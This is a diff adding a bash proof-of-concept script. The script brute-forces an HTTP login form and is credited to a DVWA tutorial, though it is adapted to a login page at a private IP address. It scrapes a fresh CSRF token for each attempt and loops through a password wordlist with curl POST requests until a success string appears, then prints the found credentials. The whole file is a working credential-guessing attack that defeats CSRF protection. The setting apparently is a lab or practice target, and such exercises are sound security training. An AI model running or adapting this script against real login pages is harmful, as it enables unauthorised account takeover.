@@ -1,0 +1,57 @@
+#!/bin/bash
+# Quick PoC template for HTTP GET form brute force with CSRF token
+# Target: DVWA v1.10 (Brute Force - High)
+#   Date: 2015-11-07
+# Author: g0tmi1k ~ https://blog.g0tmi1k.com/
+# Source: https://blog.g0tmi1k.com/dvwa/bruteforce-high/
+
+## Variables
+URL="http://192.168.30.11/login.php?next=http%3A%2F%2F192.168.30.11%2Findex.php"
+DVWA_USER="emmanouil"
+DVWA_PASS="password"
+USER_LIST="/usr/share/seclists/Usernames/top_shortlist.txt"
+PASS_LIST="/usr/share/dirb/wordlists/small.txt"
+COOKIE="Cookie: session=b0822d50-6a88-4221-9618-fe4d784d6214"
+#COOKIE HANDMATIG INVULLEN!!!!
+## Value to look for in response (Whitelisting)
+SUCCESS="Redirecting..."
+
+## Anti CSRF token
+CSRF="$( curl -s  "${URL}" -H "${COOKIE}" | awk -F 'value=' '/csrf_token/ {print $2}' | cut -d "'" -f2 |  sed -e 's/"\(.*\)">/\1/' )"
+
+
+## Login to DVWA core
+
+## Counter
+i=0
+## Password loop
+while read -r _PASS; do
+  ## Username loop
+##  while read -r _USER; do
+    ## Increase counter
+    ((i=i+1))
+    ## Feedback for user
+    echo "[i] Try ${i}: ${DVWA_USER} // ${_PASS}"
+    ## CSRF token
+    USER_TOKEN="$( curl -s  "${URL}" -H "${COOKIE}" | awk -F 'value=' '/csrf_token/ {print $2}' | cut -d "'" -f2 |  sed -e 's/"\(.*\)">/\1/' )"
+
+    ## Connect to server
+    ##REQUEST="$( curl -X POST "${URL}" -H "${COOKIE}" -d "username=${DVWA_USER}&password=${_PASS}&is_Admin=false&csrf_token=${USER_TOKEN}&Login=Login" )"
+     var="curl -s -X POST \""${URL}"\" -H \""${COOKIE}"\" -d \""username=${DVWA_USER}\&password=${_PASS}\&is_admin=false\&csrf_token=${USER_TOKEN}\&login=Login\"""
+     #                                                       username=asda&password=&is_admin=false&csrf_token=ZPPKBTLDIB6F3MLH&login=Login
+     REQUEST=$(eval $var)
+     #echo $REQUEST
+    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'
+
+    ## Check response
+    echo "${REQUEST}" | grep -q "${SUCCESS}"
+    if [[ "$?" -eq 0 ]]; then
+      ## Success!
+      echo -e "\n\n[i] Found!"
+      echo "[i] Username: ${_USER}"
+      echo "[i] Password: ${_PASS}"
+      break 2
+    fi
+
+  ##done < ${USER_LIST}
+done < ${PASS_LIST}
